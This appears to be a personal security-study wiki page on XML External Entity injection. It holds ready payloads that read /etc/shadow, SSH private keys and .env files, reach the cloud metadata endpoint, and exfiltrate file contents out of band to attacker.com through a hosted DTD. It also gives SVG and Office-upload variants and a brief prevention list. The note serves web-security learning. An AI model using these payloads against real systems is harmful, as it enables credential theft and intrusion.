# XXE — XML External Entity Injection

← [[A03-Injection]]

---

XXE is when an XML parser processes external entity references defined by the attacker. It can read local files, perform SSRF, or (in rare cases) RCE.

---

## How XML Entities Work

XML has a feature called "entities" — think of them as variables. External entities reference external resources.

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY myentity "hello world">
]>
<root>&myentity;</root>
<!-- Renders: <root>hello world</root> -->
```

External entities can reference files:

```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
```

When the parser processes `&xxe;`, it reads `/etc/passwd` and inserts its contents. If those contents are returned in the response — you have file read.

---

## Basic XXE — File Read

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>
```

If the app returns the value of `<data>`, you get `/etc/passwd`.

---

## Where XXE Exists

Any feature that processes XML:
- SOAP web services
- XML-based APIs (`Content-Type: application/xml` or `text/xml`)
- File upload: `.docx`, `.xlsx`, `.pptx`, `.svg`, `.xml` (these are ZIP files containing XML)
- SVG image processing
- RSS/Atom feed parsers
- PDF generators that accept XML input

> [!TIP]
> Try changing `Content-Type: application/json` to `Content-Type: application/xml` and reformatting the body as XML. Some apps accept both and the XML parser may be less hardened.

---

## XXE Payloads

### Linux File Read

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>
```

```xml
<!-- Other valuable targets -->
<!ENTITY xxe SYSTEM "file:///etc/shadow">
<!ENTITY xxe SYSTEM "file:///proc/self/environ">
<!ENTITY xxe SYSTEM "file:///var/www/html/.env">
<!ENTITY xxe SYSTEM "file:///home/ubuntu/.ssh/id_rsa">
```

### Windows File Read

```xml
<!ENTITY xxe SYSTEM "file:///C:/windows/win.ini">
<!ENTITY xxe SYSTEM "file:///C:/inetpub/wwwroot/web.config">
```

### SSRF via XXE

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root><data>&xxe;</data></root>
```

The server fetches the URL — same impact as [[SSRF-Overview]].

---

## Blind XXE

If the XML response doesn't reflect the entity value, you need out-of-band techniques.

### Out-of-Band File Exfiltration

**External DTD method:** Host a malicious DTD file on your server.

Your server hosts `evil.dtd`:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % exfil "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/?data=%file;'>">
%exfil;
%send;
```

Payload you send:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<root></root>
```

The target server fetches your DTD, evaluates it, and makes a second request to your server with the file contents in the URL parameter.

### Blind XXE for SSRF Confirmation

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://your-burp-collaborator.net">
  %xxe;
]>
<root></root>
```

If you get a hit on Burp Collaborator, XXE with SSRF is confirmed even without seeing output.

---

## XXE in File Uploads

### SVG Upload

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

Upload this as a `.svg` file. If the server renders it and returns the result, the file content appears in the image.

### XLSX / DOCX Upload

Office documents contain XML files internally. Unzip the document, modify one of the XML files to include your XXE payload, re-zip and upload.

```bash
# Unzip
cp file.xlsx file.zip && unzip file.zip -d xlsx_contents

# Edit xl/workbook.xml or [Content_Types].xml
# Add XXE payload

# Rezip
cd xlsx_contents && zip -r ../evil.xlsx .
```

---

## XXE vs XInclude

If you can't control the DOCTYPE declaration (because the app constructs the XML around your input), try XInclude:

```xml
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</root>
```

XInclude is a separate XML specification but some parsers support it.

---

## Preventing XXE

- Disable external entity processing in the XML parser (most parsers support this)
- Use less complex data formats (JSON) where XML isn't needed
- Validate, filter, or sanitize XML input

---

*Related: [[A03-Injection]] | [[SSRF-Overview]]*

*Sources: PortSwigger Web Security Academy, OWASP XXE Prevention Cheat Sheet*
